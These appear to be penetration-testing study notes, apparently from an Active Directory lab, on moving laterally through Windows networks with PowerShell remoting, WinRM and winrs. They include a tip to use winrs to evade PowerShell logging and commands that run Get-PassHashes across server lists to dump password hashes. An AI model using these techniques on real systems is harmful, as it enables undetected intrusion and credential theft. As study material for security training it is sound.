
> [!NOTE] **IMPORTANT**
> Rinse and repeat once you compromise another machine. Do the exact same enumeration from a different user/machine standpoint after trying to privesc

Enabled by default on Server 2012 onwards with a firewall exception and is the recommended way to manage Windows Core servers

You'll have to enable remoting on Desktop Windows machines and Admin privileges are required for that.

### OPSEC OPTION - winrs
PowerShell remoting supports the system-wide transcripts and deep script block logging. We can use `winrs` in place of PSRemoting to evade the logging

```powershell
winrs -r:server1 cmd
```

```powershell
winrs -r:dcorp-mgmt set computername;set username
```

```powershell
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 set username
```

We can also use winrm.vbs and COM objects of WSMan object -
https://github.com/bohops/WSMan-WinRM

### NON-OPSEC OPTION
One-to-One. Interactive. Runs in a stateful and trusted process (`wsmprovhost`)
```powershell
Enter-PSSession -ComputerName dcorp-adminsrv
New-PSSession -ComputerName dcorp-adminsrv
```

Store sessions in variables and connect
```powershell
$adminsrv = New-PSSession -ComputerName dcorp-adminsrv
$adminsrv

Enter-PSSession -Session $adminsrv
```

**One-to-Many**. Known as Fan-out remoting and is non-interactive. This can execute commands and scripts on multiple machines at once. Can be ran as a background job and by default in memory.

```powershell
Invoke-Command
```

Use `-Credential` parameter to pass username:password
```powershell
Invoke-Command -Scriptblock {$env:computername;$env:username} -ComputerName (Get-Content <list_of_servers.txt>)
```

Run local scripts on remote machines
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1  -ComputerName (Get-Content <list_of_servers.txt>)
```

Execute locally loaded functions on remote machine
```powershell 
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

With Arguments
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

Execute `stateful` commands on target machines
```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {ls env:}
Invoke-Command -Session $Sess -ScriptBlock {$env:Username} 
```

